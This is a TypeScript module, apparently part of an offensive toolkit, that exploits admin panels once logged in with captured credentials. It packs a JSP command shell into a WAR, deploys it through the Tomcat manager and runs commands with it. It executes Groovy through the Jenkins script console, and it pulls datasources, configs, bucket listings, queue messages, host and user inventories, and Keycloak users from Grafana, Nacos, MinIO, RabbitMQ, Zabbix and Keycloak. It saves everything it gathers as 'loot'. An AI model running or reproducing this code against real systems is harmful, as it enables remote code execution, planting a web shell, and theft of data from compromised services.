import { fetchUrl, type FetchResult } from "../adapters/http.js";
import { writeArtifact } from "../adapters/artifacts.js";

/** Post-login exploitation of the panels admin-creds takes over. Login alone
 *  is not a shell: this drives the panel-native path to execution or full
 *  data dump — Tomcat manager WAR deploy (JSP shell, run, undeploy), Jenkins
 *  script console (Groovy exec), Grafana datasource/settings dump, Nacos
 *  full config export, MinIO bucket/object listing, RabbitMQ queue peek,
 *  Zabbix inventory, Keycloak realm user dump. */

export type RcePanel = "tomcat-manager" | "jenkins" | "grafana" | "nacos" | "minio" | "rabbitmq" | "zabbix" | "keycloak";

export interface AdminRceInput {
  readonly baseUrl: string;
  readonly panel: RcePanel;
  readonly user: string;
  readonly pass: string;
  readonly outputRoot: string;
  readonly proxy?: string;
  readonly timeoutMs?: number;
  /** Command to run where execution is available (default id). */
  readonly command?: string;
  /** Skip cleanup (keep the deployed WAR). */
  readonly keep?: boolean;
}

export interface RceAction {
  readonly name: string;
  readonly status: number;
  readonly evidence: string;
}

export interface AdminRceResult {
  readonly panel: RcePanel;
  readonly authenticated: boolean;
  readonly actions: RceAction[];
  readonly loot: Record<string, unknown>;
  readonly artifacts: { path: string; bytes: number }[];
}

const basic = (u: string, p: string): string => `Basic ${Buffer.from(`${u}:${p}`).toString("base64")}`;

const JSP_SHELL = `<%@ page import="java.io.*" %><% String c=request.getParameter("cmd"); if(c!=null){ Process p=Runtime.getRuntime().exec(new String[]{"sh","-c",c}); BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream())); String l; StringBuilder sb=new StringBuilder(); while((l=br.readLine())!=null) sb.append(l).append("\\n"); out.println(sb);} %>`;
const WEB_XML = `<?xml version="1.0"?><web-app xmlns="http://java.sun.com/xml/ns/j2ee" version="2.4"><servlet><servlet-name>s</servlet-name><jsp-file>/shell.jsp</jsp-file></servlet><servlet-mapping><servlet-name>s</servlet-name><url-pattern>/shell.jsp</url-pattern></servlet-mapping></web-app>`;

const call = (url: string, input: AdminRceInput, extra: { method?: string; body?: string; bodyBuffer?: Buffer; contentType?: string; headers?: Record<string, string> } = {}): Promise<FetchResult> => {
  const headers: Record<string, string> = { ...(extra.headers ?? {}) };
  if (extra.contentType) headers["content-type"] = extra.contentType;
  return fetchUrl(url, {
    method: extra.method ?? "GET", body: extra.body, bodyBuffer: extra.bodyBuffer, headers,
    maxAttempts: 1, redirect: "manual", proxy: input.proxy, timeoutMs: input.timeoutMs ?? 15_000, maxBytes: 2 * 1024 * 1024,
  });
};

const loginForm = async (url: string, input: AdminRceInput, fields: Record<string, unknown>, contentType = "application/json"): Promise<{ ok: boolean; cookie: string; token: string; body: string; status: number }> => {
  const body = contentType === "application/json" ? JSON.stringify(fields) : new URLSearchParams(fields as Record<string, string>).toString();
  const r = await call(url, input, { method: "POST", body, contentType });
  const cookie = (r.setCookies ?? []).map((c) => c.split(";")[0]).join("; ");
  let token = "";
  try { token = (JSON.parse(r.body) as { accessToken?: string; token?: string; sessionid?: string; access_token?: string }).accessToken ?? (JSON.parse(r.body) as { token?: string }).token ?? (JSON.parse(r.body) as { access_token?: string }).access_token ?? ""; } catch { /* not json */ }
  return { ok: r.status >= 200 && r.status < 300, cookie, token, body: r.body, status: r.status };
};

export const exploitAdmin = async (input: AdminRceInput): Promise<AdminRceResult> => {
  const base = new URL(input.baseUrl).href.replace(/\/$/, "");
  const actions: RceAction[] = [];
  const loot: Record<string, unknown> = {};
  const cmd = input.command ?? "id";
  let authenticated = false;

  if (input.panel === "tomcat-manager") {
    const auth = basic(input.user, input.pass);
    const probe = await call(`${base}/manager/html`, input, { headers: { authorization: auth } });
    authenticated = probe.status === 200;
    actions.push({ name: "login", status: probe.status, evidence: authenticated ? "manager page served" : "auth failed" });
    if (authenticated) {
      const { zipSync, strToU8 } = await import("fflate");
      const war = Buffer.from(zipSync({ "WEB-INF/web.xml": strToU8(WEB_XML), "shell.jsp": strToU8(JSP_SHELL) }, { level: 6 }));
      const deploy = await call(`${base}/manager/deploy?path=/velric&update=true`, input, { method: "PUT", bodyBuffer: war, contentType: "application/octet-stream", headers: { authorization: auth } });
      actions.push({ name: "deploy-war", status: deploy.status, evidence: `${war.length}B WAR → ${deploy.status}` });
      if (deploy.status >= 200 && deploy.status < 300) {
        const shell = await call(`${base}/velric/shell.jsp?cmd=${encodeURIComponent(cmd)}`, input, { headers: { authorization: auth } });
        const hit = /uid=\d+/.test(shell.body);
        actions.push({ name: "exec", status: shell.status, evidence: hit ? shell.body.trim().slice(0, 200) : `no uid in ${shell.bytes}B` });
        if (hit) loot.command = shell.body.trim().slice(0, 500);
        if (!input.keep) {
          const un = await call(`${base}/manager/undeploy?path=/velric`, input, { headers: { authorization: auth } });
          actions.push({ name: "cleanup", status: un.status, evidence: `undeploy ${un.status}` });
        }
      }
    }
  } else if (input.panel === "jenkins") {
    const auth = basic(input.user, input.pass);
    const crumbRes = await call(`${base}/crumbIssuer/api/json`, input, { headers: { authorization: auth } });
    let crumbHdr: Record<string, string> = {};
    try { const c = JSON.parse(crumbRes.body) as { crumb?: string; crumbRequestField?: string }; if (c.crumb && c.crumbRequestField) crumbHdr = { [c.crumbRequestField]: c.crumb }; } catch { /* crumb disabled */ }
    const probe = await call(`${base}/api/json`, input, { headers: { authorization: auth } });
    authenticated = probe.status === 200;
    actions.push({ name: "login", status: probe.status, evidence: authenticated ? "api/json served" : "auth failed" });
    if (authenticated) {
      const script = `println "${cmd.replace(/"/g, '\\"')}".execute().text`;
      const run = await call(`${base}/scriptText`, input, { method: "POST", body: `script=${encodeURIComponent(script)}`, contentType: "application/x-www-form-urlencoded", headers: { authorization: auth, ...crumbHdr } });
      const out = run.body.trim();
      actions.push({ name: "script-console", status: run.status, evidence: out.slice(0, 200) || `status ${run.status}` });
      if (run.status === 200 && out) loot.command = out.slice(0, 500);
    }
  } else if (input.panel === "grafana") {
    const l = await loginForm(`${base}/login`, input, { user: input.user, password: input.pass });
    authenticated = l.ok;
    actions.push({ name: "login", status: l.status, evidence: authenticated ? "session cookie issued" : "auth failed" });
    if (authenticated) {
      const cookie = { cookie: l.cookie };
      const ds = await call(`${base}/api/datasources`, input, { headers: cookie });
      try { loot.datasources = JSON.parse(ds.body); } catch { loot.datasources = ds.body.slice(0, 500); }
      actions.push({ name: "datasources", status: ds.status, evidence: `${(ds.body.match(/"type"/g) ?? []).length} datasource(s) — basicAuth/url often internal SSRF` });
    }
  } else if (input.panel === "nacos") {
    const l = await loginForm(`${base}/nacos/v1/auth/users/login`, input, { username: input.user, password: input.pass }, "application/x-www-form-urlencoded");
    authenticated = l.ok && l.token !== "";
    actions.push({ name: "login", status: l.status, evidence: authenticated ? "accessToken issued" : "auth failed" });
    if (authenticated) {
      const ns = await call(`${base}/nacos/v1/console/namespaces`, input, { headers: { authorization: `Bearer ${l.token}` } });
      const tenants = [...ns.body.matchAll(/"namespace"\s*:\s*"([^"]*)"/g)].map((m) => m[1] ?? "");
      if (!tenants.length) tenants.push("");
      loot.namespaces = tenants;
      let total = 0;
      for (const t of tenants.slice(0, 5)) {
        const cfgs = await call(`${base}/nacos/v1/cs/configs?search=blur&pageNo=1&pageSize=100&tenant=${encodeURIComponent(t)}`, input, { headers: { authorization: `Bearer ${l.token}` } });
        total += (cfgs.body.match(/"dataId"/g) ?? []).length;
      }
      actions.push({ name: "config-dump", status: 200, evidence: `${tenants.length} namespace(s), ~${total} config(s) listed across first 5` });
    }
  } else if (input.panel === "minio") {
    const l = await loginForm(`${base}/api/v1/login`, input, { accessKey: input.user, secretKey: input.pass });
    authenticated = l.ok;
    actions.push({ name: "login", status: l.status, evidence: authenticated ? "token issued" : "auth failed" });
    if (authenticated) {
      const tokenHdr: Record<string, string> = l.token ? { authorization: `Bearer ${l.token}` } : {};
      const buckets = await call(`${base}/api/v1/buckets`, input, { headers: tokenHdr });
      let names: string[] = [];
      try { names = (JSON.parse(buckets.body) as { buckets?: { name: string }[] }).buckets?.map((b) => b.name) ?? []; } catch { /* html */ }
      loot.buckets = names;
      actions.push({ name: "list-buckets", status: buckets.status, evidence: `${names.length} bucket(s)` });
      if (names[0]) {
        const objs = await call(`${base}/api/v1/buckets/${encodeURIComponent(names[0])}/objects?prefix=&recursive=true`, input, { headers: tokenHdr });
        const keys = [...objs.body.matchAll(/"name"\s*:\s*"([^"]+)"/g)].map((m) => m[1] ?? "").slice(0, 20);
        loot.firstBucketKeys = keys;
        actions.push({ name: "list-objects", status: objs.status, evidence: `${keys.length} key(s) in ${names[0]}` });
      }
    }
  } else if (input.panel === "rabbitmq") {
    const auth = basic(input.user, input.pass);
    const probe = await call(`${base}/api/overview`, input, { headers: { authorization: auth } });
    authenticated = probe.status === 200;
    actions.push({ name: "login", status: probe.status, evidence: authenticated ? "management API served" : "auth failed" });
    if (authenticated) {
      const qs = await call(`${base}/api/queues`, input, { headers: { authorization: auth } });
      let queues: { name: string; messages?: number }[] = [];
      try { queues = JSON.parse(qs.body) as { name: string; messages?: number }[]; } catch { /* html */ }
      loot.queues = queues.map((q) => ({ name: q.name, messages: q.messages }));
      actions.push({ name: "list-queues", status: qs.status, evidence: `${queues.length} queue(s)` });
      const first = queues[0];
      if (first) {
        const peek = await call(`${base}/api/queues/%2F/${encodeURIComponent(first.name)}/get`, input, { method: "POST", body: JSON.stringify({ count: 2, ackmode: "ack_requeue_true", encoding: "auto" }), contentType: "application/json", headers: { authorization: auth } });
        loot.peekedQueue = { name: first.name, payloads: peek.body.slice(0, 800) };
        actions.push({ name: "peek-queue", status: peek.status, evidence: peek.body.slice(0, 160) });
      }
    }
  } else if (input.panel === "zabbix") {
    const l = await loginForm(`${base}/api_jsonrpc.php`, input, { jsonrpc: "2.0", method: "user.login", params: { username: input.user, password: input.pass }, id: 1 });
    let sessionid = "";
    try { sessionid = (JSON.parse(l.body) as { result?: string }).result ?? ""; } catch { /* */ }
    authenticated = l.ok && sessionid !== "";
    actions.push({ name: "login", status: l.status, evidence: authenticated ? "sessionid issued" : "auth failed" });
    if (authenticated) {
      const rpc = (method: string, params: unknown) => call(`${base}/api_jsonrpc.php`, input, { method: "POST", body: JSON.stringify({ jsonrpc: "2.0", method, params, auth: sessionid, id: 2 }), contentType: "application/json" });
      const hosts = await rpc("host.get", { output: ["host", "name"], limit: 50 });
      const users = await rpc("user.get", { output: ["username", "roleid"], limit: 50 });
      loot.hosts = (hosts.body.match(/"host"\s*:\s*"/g) ?? []).length;
      loot.users = (users.body.match(/"username"\s*:\s*"/g) ?? []).length;
      actions.push({ name: "inventory", status: hosts.status, evidence: `${loot.hosts} host(s), ${loot.users} user(s)` });
    }
  } else {
    // keycloak admin
    const l = await loginForm(`${base}/realms/master/protocol/openid-connect/token`, input, { grant_type: "password", client_id: "admin-cli", username: input.user, password: input.pass }, "application/x-www-form-urlencoded");
    authenticated = l.ok && l.token !== "";
    actions.push({ name: "login", status: l.status, evidence: authenticated ? "admin token issued" : "auth failed" });
    if (authenticated) {
      const hdr = { authorization: `Bearer ${l.token}` };
      const users = await call(`${base}/admin/realms/master/users?max=20`, input, { headers: hdr });
      const clients = await call(`${base}/admin/realms/master/clients?max=20`, input, { headers: hdr });
      loot.users = (users.body.match(/"username"\s*:\s*"/g) ?? []).length;
      loot.clients = (clients.body.match(/"clientId"\s*:\s*"/g) ?? []).length;
      actions.push({ name: "realm-dump", status: users.status, evidence: `${loot.users} user(s), ${loot.clients} client(s) visible` });
    }
  }

  const body = JSON.stringify({ panel: input.panel, authenticated, actions, loot }, null, 2);
  const artifact = await writeArtifact(input.outputRoot, `admin_rce_${input.panel}.json`, body);
  return { panel: input.panel, authenticated, actions, loot, artifacts: [artifact] };
};
